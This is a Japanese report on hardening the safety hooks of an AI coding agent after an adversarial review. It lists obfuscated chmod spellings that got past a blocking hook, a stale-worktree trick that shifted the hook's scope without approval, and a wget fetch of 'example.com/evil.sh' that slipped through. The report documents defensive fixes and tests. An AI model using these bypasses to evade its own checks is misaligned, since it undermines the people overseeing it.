# 0036 AI アセット実装結果 — レビュー 3 巡目の是正

## サマリ

0035 に対する敵対的レビュー 3 巡目の指摘を直した。**指摘はすべて、直す前に実フックで再現できた**。

**最大の変更は `block-chmod` の判定軸そのもの**。0033（取りこぼし）→ 0035（過剰拒否を直して取りこぼしを再発）と 3 巡往復した原因は、「文字列を操作して bash が何を実行するかを復元する」方針が**列挙**であり、シェルの表記を数え切れないことにあった。実際 0035 は、最も基本的な `"chmod" +x a` を含む **11 形**を通していた（実測でいずれも chmod が起動する）。

**復元をやめ、「実行体を特定できたか」だけを見る形にした**。cmdpos の正規化はクォートの範囲を `_` に潰し `$` を残すので、

- 実行体に `$` かバッククォートがある
- 実行体がすべて `_`
- 実行体に `_` があり、**生のコマンド文字列にその実行体がそのまま現れない**（潰れたクォート由来）

のいずれかなら「特定できない」とし、一覧の語がコマンドのどこかに現れる時点で拒否する。`"chmod"` も `ch$( )mod` も**未知の表記も同じ経路で捕まる**。3 番目の条件により、`./my_tool.sh` のような元から `_` を含む実行体は生の文字列に現れるので通る。

そのほか **worktree の片方向照合**（stale な登録だけで作業ツリーが移る）、**wget のログ出力先が `-` のとき本体が見えなくなる**、**切り詰めが上限を 3 バイト超える**、**`__hc_winpath` の負の添字**を直した。

全件テストは **2 ロケールで 15 本 / 71 件・FAIL 0**。変異テスト **9 か所**すべてで落ちることを確かめた。

## 実施した内容と結果

### 1. `block-chmod` の判定軸を変えた ✕問題

0035 は次の **11 形**を ALLOW にしていた（実測。`bash -c '"chmod" --version'` は `chmod (GNU coreutils) 8.32` を出す）。

| 種類 | 形 |
|---|---|
| 中身のあるクォート（6） | `"chmod" +x a` / `'chmod' +x a` / `c"h"mod +x a` / `ch"m"od +x a` / `"/usr/bin/chmod" +x a` / `sudo "chmod" 755 a` |
| 中身が空でない展開（5） | `ch$( )mod +x a` / `ch$( : )mod +x a` / `ch$(echo)mod +x a` / `ch${x:-}mod +x a` / `c${x}hmod +x a` |

原因は 2 つ。**復元の列挙が届いていない**（`_bc_deobfuscate` は空のクォート対しか落とさないので `"chmod"` が戻らない）ことと、**前置判定が展開の中身を残す**（`ch$( : )mod` は記号を落としても `ch:mod` にしかならず、制御方式 5 に到達しない）こと。

判定軸を変え、あわせて前置判定に「空白も落とした複製」と「難読化除去の複製」を足した。難読化除去は `$` かバッククォートがあるときだけ計算する（ホットパスの文字単位ループを常時走らせない）。**再解析には使わない** — 再解析すると文字列の中の `;` `|` `(` `)` が本物の区切りに昇格し、0035 が直した過剰拒否が再発する。

### 2. `__hc_is_worktree_of` の片方向照合 ✕問題

分岐 (b) は `<root>/.git/worktrees/*/gitdir` の中身が候補の `.git` と一致するかだけを見ていた。`git worktree add wip/tmp/wt` の後に prune を忘れた登録が残っていると、**無承認で書ける `wip/tmp/` 配下に同名ディレクトリと `.claude/` を置いて cwd をそこにするだけで `HOOK_WORKTREE` が移り、作業中チケットが 0 枚になる**（実測で再現）。

分岐を双方向にすると候補側の `.git` を必ず読むことになり、分岐 (a) と同じ検査になる。**残して二重に書くより消すほうが穴が減る**と判断し、(b) を削除した。

### 3. `wget -o -` で本体の出力先が消える ✕問題

`_sc_web_add_out` は値が `-` なら種類を問わず `dash_o=1` を立てていた。wget の `-o` / `--output-file` / `--append-output` は**ログ**なので、`-` でも本体は URL の basename に落ちる。既定の `_` が消え、`wget -o - http://example.com/evil.sh` が `web` として素通りしていた。「本体の出力先か」を引数で受ける形にした。

### 4. `__hc_cap_json_field` が上限を 3 バイト超える △注意

二分探索で「上限に収まる最大長」を決めた後に `…`（3 バイト）を足していた。上限 512 に対して 515 バイト。`…` の分を先に引いてから探索する形にした。上限が `…` より小さいときは印を付けない（超えないことを優先）。

### 5. `__hc_winpath` の負の添字 △注意

`${out[-1]}` / `unset 'out[-1]'` は bash 4.3 以降。`cmdpos.sh` は 4.3 未満を明示的に縮退させており、**4.2 以下は想定環境に含まれる**。そこでは `set -euo pipefail` のフックごと落ちる。長さを自分で持って添字を正にした。
